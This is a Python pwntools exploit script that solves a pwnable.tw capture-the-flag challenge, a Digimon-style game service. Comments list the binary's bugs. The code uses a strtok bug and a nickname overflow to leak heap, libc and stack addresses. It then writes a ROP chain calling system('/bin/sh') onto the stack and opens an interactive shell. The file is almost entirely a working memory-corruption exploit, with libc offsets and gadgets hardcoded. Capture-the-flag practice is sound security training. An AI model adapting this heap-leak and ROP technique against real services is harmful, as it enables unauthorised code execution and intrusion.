###Unexploitable Bugs
#  1.uninitialized talk target idx in talk() if no NPC are nearby
#       idx not controllable on remote libc version
#  2.memory leak for allocated pthread_t
#  3.OOB when deleting toolmon(the current_partner idx is not updated)
#       OOB idx does not point to useful ptr
#  4.race condition when leveling up digimon via task & item at same time
#       printing digimon image crashes due to imageptr array OOB

###Exploitable bug
#  1.strtok in main overwrites partneridx

from pwn import *

###Util
def do(ac):
    res = r.recvuntil(('Encounter','> '))
    if b'Encounter' in res:
        encounter()
        do(ac)
    else:
        if len(ac)<0x68:
            r.sendline(ac)
        else:
            r.send(ac)
        return True

def walk(direction):
    do(direction)

def mons():
    do('mons')
    res = r.recvuntil('\n－－－',drop=True).split(b'\nNo. ')
    return res

def notification():
    do('notifi')
    res = r.recvuntil('\n－－－',drop=True).split(b'\n')
    return res

def talk(mode='home',ins=None,args=None):
    res = do('talk')
    DELIM={''}
    if mode=='home':
        res = r.recvuntil(('to?\n','(y/N)\n','partner!\n'))
        if b'to?\n' in res:
            r.sendline('1')
            res = r.recvuntil(('(y/N)\n','partner!\n'))
        if b'(y/N)\n' in res:
            r.sendline('N')
        else:
            r.sendline(str(args))
        return
    elif mode=='toolmonA':
        r.sendlineafter('(y/N)\n','y')
        r.recvuntil('Encounter')
        encounter(mode='toolmon')
        r.sendlineafter('(Y/n)\n','y')
    elif mode=='toolmonU':
        res = r.recvuntil(('to?\n','Nothing\n'))
        if b'to?\n' in res:
            r.sendline('3')
            res = r.recvuntil('Nothing\n')
        r.sendline(str(ins))
        if args is not None:
            for arg in args:
                r.sendlineafter(arg[0],arg[1])
    elif mode=='shop':
        res = r.recvuntil(('to?\n','$ '))
        if b'to?\n' in res:
            r.sendline('2')
            res = r.recvuntil('$ ')
        r.sendline('3')
        r.sendlineafter('buy?\n',str(args[0]))
        r.sendlineafter(')\n',str(args[1]))
        r.sendlineafter('$ ','4')

def useitem(idx,arg=None):
    do(f'item {idx}')
    if arg is not None:
        r.sendline(str(arg))

def task(digimonidx,tasktype=0,start='n'):
    do(f'task {digimonidx}')
    if type(digimonidx)==type(0):
        r.sendlineafter('do?\n',str(tasktype))
    if b'(y/N)' in r.recvline():
        r.sendline(start)

def nickname(digimonidx,name):
    do(f'nick {digimonidx}')
    r.sendlineafter('name: \n',name)

def parse_stats():
    res = r.recvuntil('~ ').split(b'\n')
    enemy = res[0].strip()
    selfhp = float(res[4].split(b' : ')[1].split(b' / ')[0])
    selfatk = float(res[5].split(b' : ')[1].split(b' ')[0])
    enhp = float(res[7].split(b' : ')[1].split(b' / ')[0])
    enatk = float(res[8].split(b' : ')[1].split(b' ')[0])
    return enemy, selfhp, selfatk, enhp, enatk

def battle(mode='normal'):
    r.sendline('1')
    while True:
        if mode=='normal':
            res = r.recvuntil(('Enemy','Retreating','Money'))
        else:
            res = r.recvuntil(('Enemy','Retreating','Congratulations!'))
        if b'Enemy' not in res:
            return
        r.sendlineafter('~ ','1')

def retreat():
    r.sendline('4')

def befriend(atk):
    if atk is True:
        r.sendline('1')
    else:
        r.sendline('5')
    while True:
        res = r.recvuntil(('Enemy','Retreating','friendship','Money'),timeout=1)
        if b'Enemy' not in res:
            if b'friendship' in res:
                return True
            else:
                return False
        r.sendlineafter('~ ','5')

def encounter(mode='normal'):
    global POWERFUL, BEFRIEND, FRIENDCNT, OBTAINED, ENCOUNTERED
    enemy, selfhp, selfatk, enhp, enatk = parse_stats()
    ENCOUNTERED.add(enemy)
    if BEFRIEND is False and (FRIENDCNT==1 or \
                              (FRIENDCNT==2 and selfhp>150) or \
                              (FRIENDCNT==15 and selfhp>500) or \
                              (FRIENDCNT==24 and selfhp>1500)):
        if (FRIENDCNT==15 and len(ENCOUNTERED)!=24):
            retreat()
            return
        BEFRIEND = True

    elif BEFRIEND is False and POWERFUL is False and selfhp>5000 and selfatk>2000:
        POWERFUL = True
    if BEFRIEND is True:
        if enemy in OBTAINED:
            retreat()
        else:
            res = befriend(selfatk<enhp/1.5 and selfhp>enatk)
            if res is True:
                FRIENDCNT+=1
                OBTAINED.append(enemy)
                print(FRIENDCNT)
                if FRIENDCNT==15 or FRIENDCNT==24 or FRIENDCNT==32:
                    BEFRIEND = False
    elif enhp/selfatk<selfhp/enatk and (mode=='toolmon' or POWERFUL is False):
        battle(mode)
    else:
        retreat()

###Addr
#  strange version of libc2.23
environ_offset = 0x3c5f38
system_offset = 0x45390
bin_sh_offset = 0x18c177

###ROPgadget
L_pop_rdi = 0x21102

while True:
    ###STATE
    POWERFUL = False
    BEFRIEND = False
    FRIENDCNT = 1
    OBTAINED = [b'Agumon!']
    ENCOUNTERED = set([b'Agumon!'])

    ###Exploit
    r = remote('chall.pwnable.tw',10501)

    ###Collect all digimons and train until stats are high enough to beat toolmon
    while POWERFUL is False:
        walk('s')
        walk('w')
        talk(args=0)

    ###Go meet toolmon
    for i in range(18):
        walk('s')
    for i in range(18):
        walk('d')

    ###Defeat toolmon
    talk(mode='toolmonA')

    ###Enable naming
    talk(mode='toolmonU',ins=1,args=[['want?\n','10000000']])
    talk(mode='toolmonU',ins=2,args=[['go?\n','10 9']])
    talk(mode='shop',args=[0,1])
    useitem(0)

    ###let digimon at idx 0 start doing task
    task(0,3,'n')
    task(0,3,'n')
    task(0,3,'y')

    ###record time for later use
    T1 = time.time()

    ###use strtok bug to bypass occupied check and assign more tasks to digimon 0, then overflow digimon 1 name to leak nickname ptr
    payload='task 32'.ljust(0x66,'_')+' 3n   '
    r.recvuntil('> ')
    for i in range((0x11+0x58)//10):
        r.send(payload*10)
    r.send(payload*((0x11+0x58)%10))
    for i in range(0x11+0x58-1):
        r.recvuntil('> ')

    ###We would want digimon 1 nickname to lie directly below a specific digimonstate struct, so exhaust one useless chunk
    nickname(0,'test')

    ###Finally give digimon 1 a nickname and leak heap ptr, then restart if ptr offset is not suitable for further use
    nickname(1,'test')
    M = mons()
    try:
        nick_buf = u64(M[1].split(b'( ')[1].split(b' )')[0][0x58:]+b'\x00\x00')
        print(hex(nick_buf))
        if nick_buf&0xff>=0x60 and nick_buf&0xff<0xe0:
            break
    except:
        pass
    r.close()

###Now we want to probe the nickname ptr a bit to let it point into the digimonstate struct wight before it
###To do this in a stable manner, it is necessary to know how many task has been finished, so we can replenish those task entries
r.recvuntil('> ')
T2 = time.time()
r.send(payload*(int(T2-T1)+1))
for i in range(int(T2-T1)+1-1):
    r.recvuntil('> ')

###The msb of nickname ptr is now set to 0x03, the next step is to utilize digimon 1 nickname to set nickname ptr for digimon 17(the overlapping digimonstate)
###Then we can further use fake nickname of digimon 17 to perform egg hunt and leak heap base (since the heap is pretty dynamic, and i don't want to do too much game state tracing+calculation)
offset = (0x103-((nick_buf-0xb0)&0xff))&0xff
heap_cand = nick_buf&0xfffffffffffff000
padding = b'\x00'*0x58
if offset<0x80:
    padding = padding[offset:]
else:
    padding = p64(0xb1).rjust(0x100-offset-8,b'\x00')+padding
while True:
    payload = padding+p64(heap_cand+0x30)
    nickname(1,payload)
    if b'WarGreymon' in mons()[17]:
        heap_addr = heap_cand
        break
    heap_cand-=0x1000
print(hex(heap_addr))

###Then leak libc base and stack
payload = padding+p64(heap_cand+0x11)
nickname(1,payload)
pthread_addr = u64(b'\x00'+mons()[17].split(b' - ')[1].split(b' ( ')[0]+b'\x00\x00')
libc_base = (pthread_addr&0xfffffffffffff000)+0x1000
print(hex(libc_base))

payload = padding+p64(libc_base+environ_offset)
nickname(1,payload)
main_rbp = u64(mons()[17].split(b' - ')[1].split(b' ( ')[0]+b'\x00\x00')-0xf8
print(hex(main_rbp))

###Do ROP on stack and get shell
payload = padding+p64(main_rbp-0x98)
nickname(1,payload)
ROPchain = p64(libc_base+L_pop_rdi)+p64(libc_base+bin_sh_offset)+\
           p64(libc_base+system_offset)
nickname(17,ROPchain)

r.interactive()
